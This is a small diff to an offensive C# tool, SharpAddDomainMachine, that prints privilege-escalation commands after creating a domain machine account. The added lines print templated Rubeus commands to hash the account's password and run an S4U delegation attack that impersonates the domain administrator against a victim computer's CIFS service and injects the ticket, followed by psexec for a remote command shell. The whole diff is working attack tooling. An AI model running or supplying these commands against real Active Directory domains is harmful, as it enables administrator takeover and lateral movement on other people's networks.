@@ -200,6 +200,10 @@ namespace SharpAddDomainMachine
                     Console.WriteLine("\ngetST.py -dc-ip {0} {1}/{2}$:{3} -spn cifs/{4}.{5} -impersonate administrator", DomainController, Domain, machine_account, new_MachineAccount_password, victimcomputer, Domain);
                     Console.WriteLine("\nexport KRB5CCNAME=administrator.ccache");
                     Console.WriteLine("\npsexec.py {0}/administrator@{1}.{2} -k -no-pass", Domain, victimcomputer, Domain);
+                    Console.WriteLine("\n\n[+] Use Rubeus.exe to get priv!\n\n[+] Command:\n");
+                    Console.WriteLine("\nRubeus.exe hash /user:{0} /password:{1} /domain:{2}",machine_account,new_MachineAccount_password, Domain);
+                    Console.WriteLine("\nRubeus.exe s4u /user:{0} /rc4:rc4_hmac /impersonateuser:administrator /msdsspn:cifs/{1}.{2} /ptt /dc:{3}", machine_account, victimcomputer, Domain, DomainController);
+                    Console.WriteLine("\npsexec.exe \\\\{0}.{1} cmd ", victimcomputer, Domain);
                 }
                 catch (System.Exception ex)
                 {
